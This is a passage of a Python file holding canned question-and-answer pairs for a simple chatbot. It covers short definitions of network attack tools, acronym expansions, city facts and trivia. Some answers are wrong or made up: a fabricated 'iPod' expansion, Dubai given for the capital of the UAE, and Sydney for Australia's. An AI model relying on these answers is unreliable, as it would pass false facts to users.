            "what is bettercap?",
            "tell me what is bettercap?",
            "tell me what is bettercap"
        }): "Bettercap is a comprehensive network attack tool and MITM framework that allows attackers to intercept, inject, and manipulate network traffic, including web application attacks like session hijacking.",

        frozenset({
            "what is responder",
            "explain responder",
            "define responder",
            "what is responder?",
            "tell me what is responder?",
            "tell me what is responder"
        }): "Responder is a tool used for poisoning network protocols like LLMNR and NetBIOS to capture authentication credentials and launch MITM attacks on local networks.",

        frozenset({
            "what is empire",
            "explain empire",
            "define empire",
            "what is empire?",
            "tell me what is empire?",
            "tell me what is empire"
        }): "Empire is a post-exploitation framework that allows attackers to maintain control over compromised systems, enabling them to run payloads, gather data, and escalate privileges remotely.",

        frozenset({
            "what is maltego",
            "explain maltego",
            "define maltego",
            "what is maltego?",
            "tell me what is maltego?",
            "tell me what is maltego"
        }): "Maltego is an open-source intelligence (OSINT) tool used for data mining and analyzing relationships between various online entities like domains, IPs, and social media profiles.",

        frozenset({
            "what is wifite",
            "explain wifite",
            "define wifite",
            "what is wifite?",
            "tell me what is wifite?",
            "tell me what is wifite"
        }): "Wifite is an automated Wi-Fi cracking tool that targets WEP, WPA, and WPA2-PSK networks. It captures handshake packets and attempts to crack the passwords using brute-force methods.",

        frozenset({
            "what is netdiscover",
            "explain netdiscover",
            "define netdiscover",
            "what is netdiscover?",
            "tell me what is netdiscover?",
            "tell me what is netdiscover"
        }): "Netdiscover is a simple yet powerful network discovery tool that uses ARP requests to identify live hosts and IP addresses within a local network.",

        frozenset({
            "what is ncat",
            "explain ncat",
            "define ncat",
            "what is ncat?",
            "tell me what is ncat?",
            "tell me what is ncat"
        }): "Ncat is a versatile networking tool from the Nmap suite. It allows users to create reverse shells, scan networks, and transfer data, all with enhanced encryption and proxy support.",
                
        frozenset({
            "what is brb fullform",
            "brb full form",
            "full form of brb",
            "what is brb fullform?",
            "brb full form?",
            "full form of brb?"
        }): "BRB full form is Be Right Back.",

        frozenset({
            "what is fyi fullform",
            "fyi full form",
            "full form of fyi",
            "what is fyi fullform?",
            "fyi full form?",
            "full form of fyi?"
        }): "FYI full form is For Your Information.",

        frozenset({
            "what is cpu fullform",
            "cpu full form",
            "full form of cpu",
            "what is cpu fullform?",
            "cpu full form?",
            "full form of cpu?"
        }): "CPU full form is Central Processing Unit.",

        frozenset({
            "what is lcd fullform",
            "lcd full form",
            "full form of lcd",
            "what is lcd fullform?",
            "lcd full form?",
            "full form of lcd?"
        }): "LCD full form is Liquid Crystal Display.",

        frozenset({
            "what is led fullform",
            "led full form",
            "full form of led",
            "what is led fullform?",
            "led full form?",
            "full form of led?"
        }): "LED full form is Light Emitting Diode.",

        frozenset({
            "what is vr fullform",
            "vr full form",
            "full form of vr",
            "what is vr fullform?",
            "vr full form?",
            "full form of vr?"
        }): "VR full form is Virtual Reality.",

        frozenset({
            "what is ai fullform",
            "ai full form",
            "full form of ai",
            "what is ai fullform?",
            "ai full form?",
            "full form of ai?"
        }): "AI full form is Artificial Intelligence.",

        frozenset({
            "what is payload",
            "what is payload?",
            "define payload",
            "what is payload in hacking",
            "what is payload in hacking?"
        }): 
"""
A payload refers to the actual data or content being carried or transmitted, typically within a larger structure like a packet, message, or program. It's the essential part without additional metadata or headers.

For example:
In networking, the payload is the data sent within a packet, excluding headers and footers.
In hacking, it's the malicious code executed on a target system.""",
        
        frozenset({
            "what is 4g fullform",
            "4g full form",
            "full form of 4g",
            "what is 4g fullform?",
            "4g full form?",
            "full form of 4g?"
        }): "4G full form is Fourth Generation.",

        frozenset({
            "what is 5g fullform",
            "5g full form",
            "full form of 5g",
            "what is 5g fullform?",
            "5g full form?",
            "full form of 5g?"
        }): "5G full form is Fifth Generation.",

        frozenset({
            "what is ssd fullform",
            "ssd full form",
            "full form of ssd",
            "what is ssd fullform?",
            "ssd full form?",
            "full form of ssd?"
        }): "SSD full form is Solid State Drive.",

        frozenset({
            "what is hdd fullform",
            "hdd full form",
            "full form of hdd",
            "what is hdd fullform?",
            "hdd full form?",
            "full form of hdd?"
        }): "HDD full form is Hard Disk Drive.",

        frozenset({
            "what is nasa fullform",
            "nasa full form",
            "full form of nasa",
            "what is nasa fullform?",
            "nasa full form?",
            "full form of nasa?"
        }): "NASA full form is National Aeronautics and Space Administration.",

        frozenset({
            "i like it",
            "i liked it",
            "i like that",
            "i liked that"
        }): "Great!",

        frozenset({
            "what is pdf fullform",
            "pdf full form",
            "full form of pdf",
            "what is pdf fullform?",
            "pdf full form?",
            "full form of pdf?"
        }): "PDF full form is Portable Document Format.",

        frozenset({
            "what is ipod fullform",
            "ipod full form",
            "full form of ipod",
            "what is ipod fullform?",
            "ipod full form?",
            "full form of ipod?"
        }): "iPod full form is Internet Portable Object Device.",

        frozenset({
            "what is ip",
            "what is ip?",
            "what is ip address?",
            "what is ip address",
            "define ip",
            "define ip address",
            "define ip?",
            "define ip address?"
        }): "An IP (Internet Protocol) address is a unique number assigned to every device connected to a network. It helps identify the device and allows communication between devices over the internet or local network",

        frozenset({
            "what is gps fullform",
            "gps full form",
            "full form of gps",
            "what is gps fullform?",
            "gps full form?",
            "full form of gps?"
        }): "GPS full form is Global Positioning System.",

        frozenset({
            "what is mac address",
            "what is mac",
            "define mac",
            "define mac address",
            "define mac?",
            "what is mac?",
            "what is mac address",
        }): "A MAC address (Media Access Control address) is a unique identifier assigned to the network interface of a device, such as a computer or smartphone. It is used to identify devices on a local network and helps them communicate with each other. The MAC address is usually assigned by the manufacturer and is a 48-bit address, often represented in hexadecimal format.",

        frozenset({
            "what is oem fullform",
            "oem full form",
            "full form of oem",
            "what is oem fullform?",
            "oem full form?",
            "full form of oem?"
        }): "OEM full form is Original Equipment Manufacturer.",

        frozenset({
            "what is seo fullform",
            "seo full form",
            "full form of seo",
            "what is seo fullform?",
            "seo full form?",
            "full form of seo?"
        }): "SEO full form is Search Engine Optimization.",

        frozenset({
            "what is rfid fullform",
            "rfid full form",
            "full form of rfid",
            "what is rfid fullform?",
            "rfid full form?",
            "full form of rfid?"
        }): "RFID full form is Radio Frequency Identification.",

        frozenset({
            "what is vpn fullform",
            "vpn full form",
            "full form of vpn",
            "what is vpn fullform?",
            "vpn full form?",
            "full form of vpn?"
        }): "VPN full form is Virtual Private Network.",

        frozenset({
            "what is mac fullform",
            "mac full form",
            "full form of mac",
            "what is mac fullform?",
            "full form of mac address",
            "full form of mac address?"
            "mac full form?",
            "full form of mac?"
        }): "MAC full form is Media Access Control.",

        frozenset({
            "what is http",
            "define http",
            "what is http?",
            "what is the http?",
            "what is the http",
            "http meaning",
            "meaning of http"
        }): "HTTP (HyperText Transfer Protocol) is used for transmitting web pages over the internet, but it does not encrypt data.",

        frozenset({
            "what is https",
            "what is https?",
            "define https",
            "define https?",
            "meaning of https",
            "https meaning",
            "https meaning?",
            "meaning https?",
            "meaning https"
        }): "HTTPS (HyperText Transfer Protocol Secure) is the secure version of HTTP. It uses encryption (SSL/TLS) to protect data between the server and the browser.",
        
        frozenset({
            "difference between http and https?",
            "difference between http and https",
            "what is the difference between http and https?",
            "what is the difference between http and https",
            "difference between https and http",
            "difference between https and http"
        }): """
HTTP (HyperText Transfer Protocol) is used for transmitting web pages over the internet, but it does not encrypt data.

HTTPS (HyperText Transfer Protocol Secure) is the secure version of HTTP. It uses encryption (SSL/TLS) to protect data between the server and the browser.
""",
        frozenset({
            "what is ips fullform",
            "ips full form",
            "full form of ips",
            "what is ips fullform?",
            "ips full form?",
            "full form of ips?"
        }): "IPS full form is In-Plane Switching.",

        frozenset({
            "what is cloud",
            "what is the cloud?",
            "what is the cloud"
            "define cloud",
            "what is cloud?",
            "define cloud storage",
            "what is cloud storage?",
            "what is cloud storage",
            "meaning of cloud storage",
            "meaning of cloud"
        }): "The cloud refers to online storage and computing services where data and software are stored on remote servers instead of on a local device. Users can access and manage their files or applications via the internet.",

        frozenset({
            "what is a firewall?",
            "firewall meaning",
            "define firewall",
            "firewall define",
            "what is the firewall?",
            "what is firewall",
            "what is firewall?"
        }): "A firewall is a security system that monitors and controls incoming and outgoing network traffic based on predetermined security rules. It helps protect computers and networks from unauthorized access and cyber threats.",
        
        frozenset({
            "what is router",
            "define router",
            "what is router?",
            "tell me what is router?",
            "tell me what is router",
            "define what is router",
            "router meaning",
            "meaning of router"
        }): "A router is a device that forwards data packets between computer networks. It connects multiple devices to the internet or to a local network and directs data traffic to the correct destinations.",
        
        frozenset({
            "what is software update?",
            "what is software update",
            "define software update",
            "what is the software?",
            "what is the software update",
            "what is a software update",
            "what is a software update?",
            "meaning of software update",
            "software update meaning",
            "tell me what is sfotware update"
        }): "A software update is a new version or patch of a program that fixes bugs, adds features, or improves security. Regular updates are essential for keeping the software running smoothly and securely.",
        
        frozenset({
            "full form of os",
            "os full form",
            "full form of os?",
            "what is os full form",
            "what is os full form?",
            "what is full form of os",
            "what is full form of os?",
            "tell me full form of os"
        }): "OS Full Form is Operating System.",

        frozenset({
            "what is os",
            "what is operating system",
            "define operating system",
            "what is operating system?",
            "define operating system?",
            "define os",
            "what is os?",
            "define os?",
            "meaning of os",
            "meaning of os",
            "meaning of operating system",
            "meaning of operating system?"
        }): "An operating system is the software that manages computer hardware and software resources and provides services for computer programs. Examples include Windows, macOS, and Linux.",

        frozenset({
            "what is sms fullform",
            "sms full form",
            "full form of sms",
            "what is sms fullform?",
            "sms full form?",
            "full form of sms?"
        }): "SMS full form is Short Message Service.",

        frozenset({
            "best movie", 
            "your favourite movie", 
            "who is your favourite movie?", 
            "who is your favourite movie", 
            "your favorite movie"
        }): "It's hard... but I like The Dark Knight, Inception, The Shawshank Redemption, The Godfather and more..",

        frozenset({
            "where are you from", 
            "where are you from?", 
            "where are you from bruh", 
            "where are you from bro", 
            "where are you from dude", 
            "where you live"
        }): "I'm from the digital world, created by Lucky!",

        frozenset({
            "can you tell me a story?", 
            "tell me a story", 
            "can you tell me a story", 
            "tell me a story?"
        }):"Once upon a time, there was a chatbot named \033[34mMinibot\033[0m. \033[34mMinibot\033[0m loved chatting with people and helping them with their questions. The end!",

        frozenset({
            "tell me linux distros",
            "show some best linux distros",
            "linux distros",
            "tell me about linux distros",
            "tell me some linux distros",
            "tell me linux distros",
            "best linux os",
            "best linux distros",
            "what are the best linux distros?",
            "what are the best linux distros",
            "what are some best linux distros",
            "what are some best linux distros?"
        }): "It Depends on you, But if you asking top 10 best linux distros: \n1. Ubuntu\n2. Fedora\n3. Debian\n4. Arch Linux\n5. CentOS\n6. openSUSE\n7. Kali Linux",

        frozenset({
            "what is linux distros?",
            "what are linux distros?",
            "what is linux distros",
            "what are linux distros",
            "define linux distros"
        }): "Linux distros (distributions) are versions of Linux that combine the Linux kernel with software and tools to create a complete operating system. Examples include Ubuntu, Fedora, and Kali Linux.",

        frozenset({
            "what's the best way to stay productive?", 
            "how to stay productive?", 
            "how to be productive?", 
            "how to be more productive?", 
            "how to stay productive"
        }): "The best way to stay productive is to set goals, prioritize tasks, take breaks, and stay organized. You got this!",

        frozenset({
            "what's the best way to relax?", 
            "how to relax?", 
            "how to be relax?", 
            "how to be more relax?", 
            "how to stay relax"
        }): "The best way to relax is to take deep breaths, listen to music, go for a walk, meditate, or do something you enjoy. Find what works best for you!",

        frozenset({
            "what's the best way to stay healthy?", 
            "how to stay healthy?", 
            "how to be healthy?", 
            "how to be more healthy?", 
            "how to stay healthy"
        }): "The best way to stay healthy is to eat a balanced diet, exercise regularly, get enough sleep, stay hydrated, and manage stress. Your health is important!",

        frozenset({
            "what's the best way to learn something new?", 
            "how to learn something new?", 
            "how to learn new things?", 
            "how to learn something new"
        }): "The best way to learn something new is to be curious, ask questions, read books, take courses, practice regularly, and stay open to new ideas. Keep learning!",

        frozenset({
            "what is data science",
            "define data science",
            "what is data science?",
            "explain data science",
            "explain me data science"
        }): "Data science extracts knowledge and insights from data using statistics, computer science, and domain expertise to drive better decision-making.",
        
        frozenset({
            "what's the best way to make friends?", 
            "how to make friends?", 
            "how to be friends?", 
            "how to be more friends?", 
            "how to stay friends"
        }): "The best way to make friends is to be yourself, show interest in others, be kind, and be a good listener. Building friendships takes time and effort!",

        frozenset({
            "what's the best way to overcome fear?", 
            "how to overcome fear?", 
            "how to be fearless?", 
            "how to be more fearless?", 
            "how to stay fearless", 
            "can you tell me how to stay fearless"
        }): "The best way to overcome fear is to face your fears, take small steps, practice self-care, seek support, and focus on positive thinking. You are stronger than you think!",

        frozenset({
            "what is sigma?",
            "what is the sigma",
            "what is sigma",
            "define sigma"
        }): "A sigma is someone who operates independently and prefers their own company rather than being in a crowd of friends. The term allows teens to name their individuality.",

        frozenset({
            "top companies in the world",
            "top 10 companies worldwide",
            "top 10 most valuable companies",
            "list of top companies in the world"
        }): "Apple, Microsoft, Amazon, Alphabet (Google), Tesla, Berkshire Hathaway, NVIDIA, Meta (Facebook), Johnson & Johnson, Visa",

        frozenset({
            "what is duolingo",
            "what is duolingo?",
            "define duolingo",
        }): "Duolingo is A Popular Language Learning App. It uses gamification to make learning fun and engaging, with lessons focusing on vocabulary, grammar, reading, writing, and speaking skills.",
        
        frozenset({
            "what is facebook",
            "what is facebook?",
            "define facebook",
        }): "Facebook is a social media platform that allows users to connect with friends, share updates, photos, videos, and interact with others through comments, likes, and messages.",

        frozenset({
            "what is twitter",
            "what is twitter?",
            "define twitter",
        }): "Twitter is a microblogging platform where users post and interact with short messages called tweets. It allows users to share thoughts, news, and updates in real time.",

        frozenset({
            "what is new york",
            "what is new york city",
            "define new york",
            "what is NYC",
            "what is nyc"
        }): "New York City, often simply called New York, is a major city in the United States, known for its iconic landmarks like the Statue of Liberty, Central Park, Times Square, and its influence in culture, finance, and media.",

        frozenset({
            "how many weeks in a year",
            "how many weeks are in a year?",
            "how many weeks in a year?",
            "how many weeks are in a year?",
            "what is the number of weeks in a year?",
            "how many weeks make up a year?",
            "how many full weeks are in a year?",
            "what's the weekly count in a year?",
            "how many weeks in one year?",
            "how many weeks are there in one year?",
            "how many weeks in year?",
            "what's the total number of weeks in a year?"
        }): "There are 52 weeks in a year. Specifically, a year has 52 full weeks, with 1 extra day in a common year (365 days) or 2 extra days in a leap year (366 days).",

        frozenset({
            "what to watch?"
        }): "Type -ms for movie suggestion.",

        frozenset({
            "what is paris",
            "what is paris city",
            "define paris",
            "what is the capital of france"
        }): "Paris is the capital and largest city of France, known for its art, fashion, and history, with landmarks such as the Eiffel Tower, the Louvre Museum, and Notre-Dame Cathedral.",

        frozenset({
            "what is london",
            "what is london city",
            "define london",
            "what is the capital of england"
        }): "London is the capital of the United Kingdom, famous for its history, landmarks like the Big Ben, Tower of London, Buckingham Palace, and as a global center for finance and culture.",

        frozenset({
            "what is tokyo",
            "what is tokyo city",
            "define tokyo",
            "what is the capital of japan"
        }): "Tokyo is the capital of Japan, known for its modern skyline, shopping districts, cultural landmarks like the Senso-ji Temple, and as a major hub for technology and innovation.",

        frozenset({
            "what is beijing",
            "what is beijing city",
            "define beijing",
            "what is the capital of china"
        }): "Beijing is the capital of China, famous for its historical sites like the Great Wall of China, the Forbidden City, and its role as a political, cultural, and educational center in China.",

        frozenset({
            "what is sydney",
            "what is sydney city",
            "define sydney",
            "what is the capital of australia"
        }): "Sydney is the capital city of New South Wales in Australia, known for its beautiful harbor, the Sydney Opera House, and the Sydney Harbour Bridge.",

        frozenset({
            "what is rome",
            "what is rome city",
            "define rome",
            "what is the capital of italy"
        }): "Rome is the capital of Italy, known for its ancient history, landmarks like the Colosseum, Vatican City, and its influence on art, architecture, and religion.",

        frozenset({
            "what is dubai",
            "what is dubai city",
            "define dubai",
            "what is the capital of UAE"
        }): "Dubai is a major city in the United Arab Emirates, known for its futuristic architecture, luxury shopping, and landmarks like the Burj Khalifa and Palm Jumeirah.",

        frozenset({
            "what is los angeles",
            "what is LA",
            "define los angeles",
            "what is the city of los angeles"
        }): "Los Angeles, often referred to as LA, is a city in California known for its entertainment industry, including Hollywood, as well as its beaches, cultural landmarks, and vibrant lifestyle.",

        frozenset({
            "what is mumbai",
            "what is mumbai city",
            "define mumbai",
            "what is the capital of maharashtra"
        }): "Mumbai is the capital city of the Indian state of Maharashtra, known as the financial and entertainment hub of India, famous for Bollywood, the Gateway of India, and its iconic marine drive.",

        frozenset({
            "what is rio de janeiro",
            "what is rio de janeiro city",
            "define rio de janeiro",
            "what is the city of rio de janeiro"
        }): "Rio de Janeiro is a major city in Brazil, famous for its carnival, beaches like Copacabana, the Christ the Redeemer statue, and its vibrant culture.",

        frozenset({
            "who is the father of our nation",
            "who is the father of our nation?",
            "name the father of our nation",
            "who is called the father of our nation?",
            "who is known as the father of the nation?",
            "father of indian nation",
            "who is father of indian nation",
            "who is the father of indian nation?",
            "who is father of indian nation"
        }): "Mahatma Gandhi",

        frozenset({
            "who was the first president of india",
            "who was the first president of india?",
            "name the first president of india",
            "first president of india?",
            "who became the first president of india?",
            "who was the first president of india?",
            "who was the first president of india",
            "first president of india?",
            "first president of india"
        }): "Dr. Rajendra Prasad",

        frozenset({
            "who is known as father of indian constitution",
            "who is known as father of indian constitution?",
            "who is the father of the indian constitution",
            "name the father of the indian constitution",
            "who is the father of indian constitution",
            "who is the father of indian constituion?",
            "father of indian constituion",
            "father of indian constituion?"
        }): "Dr. B. R. Ambedkar",

        frozenset({
            "which is the most sensitive organ in our body",
            "which is the most sensitive organ in our body?",
            "most sensitive organ in our body?",
            "name the most sensitive organ in our body",
            "which body organ is the most sensitive?",
            "sensitive organ of human body?",
            "sensitive or organ of human body",
            "what is the sensitive organ of our body",
            "what is the sensitive organ of our body?"
        }): "Skin",

        frozenset({
            "giddha is the folk dance of",
            "giddha is the folk dance of?",
            "giddha is the folk dance of which state",
            "where is giddha danced?",
            "which state has giddha as a folk dance?",
            "which indian state giddha folk dance?",
            "which indian state giddha folk dance"
        }): "Punjab",

        frozenset({
            "who was the first prime minister of india",
            "who was the first prime minister of india?",
            "name the first prime minister of india",
            "first prime minister of india?",
            "who became india's first prime minister?",
            "first prime minister of india",
            "who is the first prime minister of india"
        }): "Jawaharlal Nehru",

        frozenset({
            "which is the heavier metal of these two, gold or silver",
            "which is the heavier metal of these two, gold or silver?",
            "which metal is heavier, gold or silver",
            "is gold or silver heavier?",
            "which is heavier, gold or silver?"
        }): "Gold",

        frozenset({
            "who invented computer",
            "who invented computer?",
            "name the inventor of the computer",
            "who is credited with inventing the computer?",
            "who is known for inventing the computer?"
        }): "Charles Babbage",

        frozenset({
            "1024 kilobytes is equal to",
            "1024 kilobytes is equal to?",
            "how many kilobytes is 1 megabyte?",
            "1024 kilobytes equals to how many megabytes?",
            "what is 1024 kilobytes in megabytes?"
            "1024 kb is equal to?",
            "1024 kb is equal to",
            "1024kb is equal to?",
            "1024kb is equal to"
        }): "1 Megabyte (MB)",

        frozenset({
            "brain of computer is",
            "brain of computer is?",
            "what is the brain of a computer?",
            "which part is called the brain of the computer?",
            "name the brain of a computer"
        }): "CPU",

        frozenset({
            "india lies in which continent",
            "india lies in which continent?",
            "which continent is india in",
            "where is india located?",
            "continent where india is located?",
            "where india is located",
            "where india is located?",
            "where is india located",
            "in which continent india lies",
            "in which continent india lies?",
            "in which continent is india?",
            "in which continent is india"
        }): "Asia",

        frozenset({
            "which country are the giza pyramids in",
            "which country are the giza pyramids in?",
            "where are the giza pyramids located",
            "giza pyramids are in which country",
            "name the country of giza pyramids"
        }): "The Giza Pyramids are in Egypt",

        frozenset({
            "highest dam of india is",
            "highest dam of india is?",
            "name the highest dam of india",
            "which is the highest dam of india",
            "what is the highest dam in india?"
        }): "Tehri Dam",

        frozenset({
            "the total distance around a figure is called its",
            "the total distance around a figure is called its?",
            "what is the total distance around a figure called?",
            "what do you call the total distance around a figure?",
            "name the total distance around a figure"
        }): "Perimeter",

        frozenset({
            "a figure with 8 sides is called",
            "a figure with 8 sides is called?",
            "name the figure with 8 sides",
            "what is a figure with 8 sides called",
            "which figure has 8 sides?"
        }): "Octagon",

        frozenset({
            "what colour symbolises peace",
            "what colour symbolises peace?",
            "which colour symbolises peace",
            "name the colour that symbolises peace",
            "colour that symbolises peace?"
        }): "The colour white symbolises peace",

        frozenset({
            "what is the largest continent on earth",
            "what is the largest continent on earth?",
            "name the largest continent on earth",
            "which is the largest continent on earth",
            "largest continent of earth"
        }): "Asia",

        frozenset({
            "which country has the largest population",
            "which country has the largest population?",
            "name the country with the largest population",
            "which country has the most people",
            "country with the largest population"
        }): "China",

        frozenset({
            "what is the capital city of france",
            "what is the capital city of france?",
            "name the capital city of france",
            "which city is the capital of france",
            "capital of france"
        }): "Paris",

        frozenset({
            "what is the currency of the european union",
            "what is the currency of the european union?",
            "name the currency of the european union",
            "which currency is used in the european union",
            "currency of the european union"
        }): "Euro",

        frozenset({
            "which river is considered the longest in the world",
            "which river is considered the longest in the world?",
            "name the longest river in the world",
            "which river is the longest",
            "longest river in the world"
        }): "Nile River",

        frozenset({
            "what is the name of the largest ocean on earth",
            "what is the name of the largest ocean on earth?",
            "name the largest ocean on earth",
            "which is the largest ocean on earth",
            "largest ocean on earth"
        }): "Pacific Ocean",

        frozenset({
            "what is the hottest planet in our solar system",
            "what is the hottest planet in our solar system?",
            "name the hottest planet in our solar system",
            "which planet is the hottest in the solar system",
            "hottest planet in the solar system"
        }): "Venus",

        frozenset({
            "who is the current secretary-general of the united nations",
            "who is the current secretary-general of the united nations?",
            "name the current secretary-general of the united nations",
            "who is the united nations secretary-general",
            "current secretary-general of the united nations"
        }): "António Guterres",

        frozenset({
            "what is the official language of brazil",
            "what is the official language of brazil?",
            "name the official language of brazil",
            "which language is official in brazil",
            "official language of brazil"
        }): "Portuguese",

        frozenset({
            "which country is known as the land of the rising sun",
            "which country is known as the land of the rising sun?",
            "name the country called the land of the rising sun",
            "which country is called the land of the rising sun",
            "land of the rising sun country"
        }): "Japan",

        frozenset({
            "what is ddos?",
            "define ddos",
            "what is ddos"
        }): "DDoS (Distributed Denial of Service) is a cyberattack where multiple systems overwhelm a target (like a website or server) with a huge amount of traffic, causing it to become slow, crash, or become unavailable to legitimate users. It often involves a network of infected devices (called a botnet) to carry out the attack.",

        frozenset({
            "what is vigilante",
            "define vigilante",
            "what is vigilante?"
        }): "A vigilante is someone who takes the law into their own hands to fight crime, often outside legal boundaries. In Example you can say SpiderMan a vigilante.",
        
        frozenset({
            "national tree of india is",
            "national tree of india is?",
            "name the national tree of india",
            "which tree is the national tree of india",
            "what is india's national tree?"
        }): "Banyan tree",

        frozenset({
            "which flower is white in colour",
            "which flower is white in colour?",
            "name the flower that is white",
            "what flower is white in colour",
            "which flower has white petals?"
        }): "Jasmine",

        frozenset({
            "who is nick carter", 
            "explain nick carter", 
            "nick carter meaning", 
            "tell me about nick carter", 
            "what does nick carter do", 
            "nick carter biography", 
            "who was nick carter"
        }): "Nick Carter is a member of the American boy band Backstreet Boys, known for hit songs like 'I Want It That Way.' He is also a solo artist, actor, and author.",
        
        frozenset({
            "agra is situated on the bank of river",
            "agra is situated on the bank of river?",
            "which river is agra situated on?",
            "name the river on which agra is located",
            "what river flows through agra?"
        }): "Yamuna",

        frozenset({
            "baby of horse is called",
            "baby of horse is called?",
            "name the baby of a horse",
            "what is a baby horse called?",
            "baby horse is known as?"
        }): "Colt",

        frozenset({
            "national animal of india",
            "national animal of india?",
            "name the national animal of india",
            "which is india's national animal",
            "what is india's national animal?"
        }): "Tiger",

        frozenset({
            "shape of egg is",
            "shape of egg is?",
            "what is the shape of an egg",
            "name the shape of an egg",
            "which shape does an egg have?"
        }): "Oval",

        frozenset({
            "most widely spoken language in the world is",
            "most widely spoken language in the world is?",
            "which language is the most widely spoken in the world",
            "name the most spoken language in the world",
            "what is the most spoken language in the world?"
        }): "Mandarin (Chinese)",

        frozenset({
            "which insect has colourful wings",
            "which insect has colourful wings?",
            "name the insect with colourful wings",
            "what insect has colourful wings",
            "which insect is known for colourful wings?"
        }): "Butterfly",

        frozenset({
            "who wrote romeo and juliet",
            "who wrote romeo and juliet?",
            "name the author of romeo and juliet",
            "which author wrote romeo and juliet",
            "who is the writer of romeo and juliet?"
        }): "William Shakespeare wrote Romeo and Juliet",

        frozenset({
            "cry of lion is called",
            "cry of lion is called?",
            "what is the cry of a lion called",
            "name the sound made by a lion",
            "what do you call the sound of a lion?"
        }): "Roar",

        frozenset({
            "what is cryptography",
            "what is cryptography?",
            "define cryptography",
            "what is crypto graphy"
        }): """
Cryptography secures information by converting it into unreadable code, ensuring privacy and protection.

1. Secures data through coding.  
2. Ensures privacy and authentication.  
3. Key methods: Encryption, Decryption, Hashing.  
4. Used in payments, messaging, and websites.
""",
        frozenset({
            "name any reptile",
            "name any reptile?",
            "give an example of a reptile",
            "what is a reptile example?",
            "can you name a reptile?"
        }): "A lizard is a reptile",

        frozenset({
            "cataract is the disease of",
            "cataract is the disease of?",
            "which part of the body does cataract affect",
            "name the organ affected by cataract",
            "what is cataract a disease of?"
        }): "Eyes",

        frozenset({
            "which organ purify our blood",
            "which organ purify our blood?",
            "name the organ that purifies blood",
            "what organ purifies the blood",
            "which organ cleans the blood?"
        }): "Kidney",

        frozenset({
            "what is programming",
            "what is programming?",
            "define programming",
            "explain programmming"
        }): "Programming is the process of creating a set of instructions (known as code) that a computer can follow to perform specific tasks. It involves writing and designing these instructions using programming languages like Python, Java, C++, and JavaScript.",

        frozenset([
            "what is developer",
            "what is a developer",
            "define developer",
            "explain developer",
            "what is developer?",
            "who is a developer"
        ]): "A developer is a person who creates, tests, and maintains software, applications, or systems using programming languages and tools. They solve problems by writing code, designing solutions, and implementing features to meet user or business needs.",

        frozenset({
            "who wrote the national anthem – jana gana mana",
            "who wrote the national anthem – jana gana mana?",
            "name the writer of the national anthem – jana gana mana",
            "who is the author of jana gana mana",
            "who wrote india's national anthem?"
        }): "Rabindra Nath Tagore",

        frozenset({
            "how many colours are there in india’s national flag",
            "how many colours are there in india’s national flag?",
            "number of colours in india's national flag",
            "what are the colours in india's national flag",
            "how many colours does india's national flag have?"
        }): "Three",

        frozenset({
            "gateway of india is located at",
            "gateway of india is located at?",
            "where is the gateway of india located",
            "name the city with the gateway of india",
            "where can you find the gateway of india?"
        }): "Mumbai",

        frozenset({
            "who was albert einstein",
            "who was albert einstein?",
            "name albert einstein",
            "what is albert einstein known for",
            "who is albert einstein?"
        }): "Albert Einstein was a famous scientist",

        frozenset({
            "what crop is famously grown in the region of darjeeling",
            "what crop is famously grown in the region of darjeeling?",
            "which crop is grown in darjeeling",
            "name the famous crop grown in darjeeling",
            "which crop is associated with darjeeling?"
        }): "The region of Darjeeling is known to grow Tea leaves",

        frozenset({
            "capital of uttarakhand is",
            "capital of uttarakhand is?",
            "name the capital of uttarakhand",
            "which is the capital of uttarakhand",
            "what is the capital of uttarakhand?"
        }): "Dehradun",

        frozenset({
            "when do we celebrate our independence day",
            "when do we celebrate our independence day?",
            "name the date of india's independence day",
            "on which date do we celebrate independence day",
            "when is independence day celebrated?"
        }): "15th August",

        frozenset({
            "sun is a",
            "sun is a?",
            "what is the sun",
            "name the sun's classification",
            "sun is a type of?"
        }): "Star",

        frozenset({
            "what city is the statue of liberty in",
            "what city is the statue of liberty in?",
            "where is the statue of liberty located",
            "name the city with the statue of liberty",
            "statue of liberty is in which city?"
        }): "The statue of liberty is in New York City",

        frozenset({
            "how many cricket world cups does india have",
            "how many cricket world cups does india have?",
            "number of cricket world cups india has won",
            "how many cricket world cups india won",
            "how many times india won the cricket world cup?"
        }): "India has two cricket world cups",

        frozenset({
            "martyrs’ day is celebrated every year on",
            "martyrs’ day is celebrated every year on?",
            "martyrs' day is observed on which date",
            "when is martyrs' day celebrated",
            "date for martyrs’ day celebration?"
        }): "30th January",

        frozenset({
            "name the first 3 planets in our solar system",
            "name the first 3 planets in our solar system?",
            "first three planets of the solar system",
            "first three planets in solar system",
            "what are the first three planets in our solar system?"
        }): "The first 3 planets in our solar system are mercury, venus, and earth",

        frozenset({
            "which is the longest river on the earth",
            "which is the longest river on the earth?",
            "longest river on earth",
            "name the longest river on earth",
            "what is the longest river on earth?"
        }): "Nile",

        frozenset({
            "gir national park in gujarat is famous for",
            "gir national park in gujarat is famous for?",
            "gir national park is known for",
            "which animal is famous in gir national park",
            "what is gir national park famous for?"
        }): "Lion",

        frozenset({
            "which animal has hump on its back",
            "which animal has hump on its back?",
            "name the animal with a hump on its back",
            "which animal has a hump on the back",
            "which animal has a back hump?"
        }): "Camel",

        frozenset({
            "name 3 root vegetables",
            "name 3 root vegetables?",
            "3 examples of root vegetables",
            "which vegetables are root vegetables",
            "name root vegetables"
        }): "Beets, carrots, and radish are root vegetables",

        frozenset({
            "name the game which is played with bat, ball and wicket",
            "name the game which is played with bat, ball and wicket?",
            "what is the game played with bat, ball and wicket",
            "which game is played with bat and ball",
            "game with bat, ball and wicket?",
            "bat ball game name"
        }): "Cricket",

        frozenset({
            "smallest state of india is",
            "smallest state of india is?",
            "name the smallest state in india",
            "which is india's smallest state",
            "india's smallest state?"
        }): "Goa",

        frozenset({
            "fastest animal on earth is",
            "fastest animal on earth is?",
            "which animal is the fastest on earth",
            "name the fastest animal on earth",
            "what is the fastest animal?"
        }): "Cheetah",

        frozenset({
            "which is the animal referred as the ship of the desert",
            "which is the animal referred as the ship of the desert?",
            "name the animal called ship of the desert",
            "which animal is called the ship of the desert",
            "what animal is referred to as the ship of the desert?"
        }): "Camel",

        frozenset({
            "which plant grows in desert",
            "which plant grows in desert?",
            "name the plant that grows in desert",
            "which plants are desert plants",
            "what plant is found in deserts?"
        }): "Cactus",

        frozenset({
            "what is cairo",
            "what is cairo city",
            "define cairo",
            "what is the capital of egypt"
        }): "Cairo is the capital city of Egypt, known for its rich ancient history, including the Pyramids of Giza, the Sphinx, and its status as the cultural center of the Arab world.",

        frozenset({
            "what is seoul",
            "what is seoul city",
            "define seoul",
